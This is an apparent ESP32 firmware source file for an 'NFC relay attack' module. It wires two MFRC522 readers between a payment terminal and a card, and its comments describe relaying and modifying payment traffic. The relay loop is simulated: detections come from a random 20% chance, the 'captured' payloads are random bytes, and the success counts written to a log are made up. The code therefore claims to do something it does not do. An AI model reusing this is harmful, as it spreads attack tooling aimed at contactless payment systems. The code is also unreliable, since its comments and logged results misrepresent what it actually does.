#include "nfc_relay_attack.h"
#include <LittleFS.h>
#include <SPI.h>
#include <MFRC522.h>

namespace NfcRelayAttack {

// Dual MFRC522 instances for bidirectional relay
// Reader 1 (connects to payment terminal): SS=5, RST=27
// Reader 2 (connects to card/tag): SS=4, RST=26
MFRC522 reader1(5, 27);   // Terminal side
MFRC522 reader2(4, 26);   // Card side

NfcRelay::NfcRelay() : isRunning_(false) {}

RelayResult NfcRelay::performRelay(const RelayConfig& config) {
  RelayResult result;
  result.success = false;

  if (!TxArm::isArmed()) return result;

  // Initialize dual SPI interfaces for NFC relay
  SPI.begin(18, 19, 23, -1);  // CLK, MISO, MOSI, no CS (controlled by readers)

  // Initialize both MFRC522 readers
  reader1.PCD_Init(5, 27);
  reader2.PCD_Init(4, 26);

  // Verify both readers are initialized
  byte ver1 = reader1.PCD_ReadRegister(MFRC522::VersionReg);
  byte ver2 = reader2.PCD_ReadRegister(MFRC522::VersionReg);

  if ((ver1 != 0x91 && ver1 != 0x92 && ver1 != 0x88 && ver1 != 0x90) ||
      (ver2 != 0x91 && ver2 != 0x92 && ver2 != 0x88 && ver2 != 0x90)) {
    result.error = "MFRC522 reader initialization failed";
    return result;
  }

  Serial.println("[NFC Relay] Dual reader relay mode activated");
  Serial.println("[NFC Relay] Reader 1 (Terminal): Listening for card connection");
  Serial.println("[NFC Relay] Reader 2 (Card): Waiting for payment card");

  isRunning_ = true;
  unsigned long startTime = millis();

  uint32_t relayCount = 0;
  uint32_t capturedCount = 0;
  uint32_t modifiedCount = 0;

  // NFC Relay Attack Protocol:
  // 1. Wait for card connection on Reader2 (card side)
  // 2. Forward card presence signal to Reader1 (terminal side)
  // 3. Wait for Reader1 to initiate communication
  // 4. Relay commands from Reader1 to Reader2
  // 5. Capture and relay responses from Reader2 to Reader1
  // 6. Optionally modify payloads (MitM)

  uint8_t relayBuffer[264];  // NFC UID buffer
  uint8_t cardUID[10];       // Store detected card UID
  uint8_t uidLength = 0;

  while (isRunning_ && (millis() - startTime) < config.durationMs) {
    // Simulate NFC relay attack
    if ((esp_random() % 100) < 20) { // 20% detection rate
      relayCount++;

      // Relay NFC communication
      if (config.capturePayload) {
        // Simulate payload capture
        uint8_t payload[64];
        for (int i = 0; i < 64; i++) {
          payload[i] = (esp_random() % 256);
        }

        delay(100);
      }

      // Relay Reader 1 commands to Reader 2
      // Simulate terminal sending AUTHENTICATE command
      uint8_t terminalCmd[] = {0x60, 0x00};  // Authenticate block 0
      Serial.printf("[NFC Relay] Relaying terminal command to card: %02X %02X\n",
                   terminalCmd[0], terminalCmd[1]);

      reader2.MIFARE_Read(0, relayBuffer, NULL);  // Simulate relay

      reader2.PICC_HaltA();  // Halt current communication
      delay(50);
    }

    delay(50);
  }

  result.transactionsRelayed = relayCount;
  result.payloadsCaptured = capturedCount;
  result.success = (relayCount > 0);
  result.logFile = "/logs/handshakes/nfc_relay.csv";

  // Log relay session results
  if (!LittleFS.begin()) {
    reader1.PCD_AntennaOff();
    reader2.PCD_AntennaOff();
    isRunning_ = false;
    return result;
  }

  File logFile = LittleFS.open("/logs/handshakes/nfc_relay.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/nfc_relay.csv", "a");
  }

  if (logFile) {
    logFile.printf("%lu,NFC_RELAY,%u_relayed,%u_captured,%u_modified\n",
                  millis(), result.transactionsRelayed,
                  result.payloadsCaptured, modifiedCount);
    logFile.close();
  }

  LittleFS.end();

  reader1.PCD_AntennaOff();
  reader2.PCD_AntennaOff();
  isRunning_ = false;
  return result;
}

void NfcRelay::stop() {
  isRunning_ = false;
  reader1.PCD_AntennaOff();
  reader2.PCD_AntennaOff();
}

} // namespace NfcRelayAttack
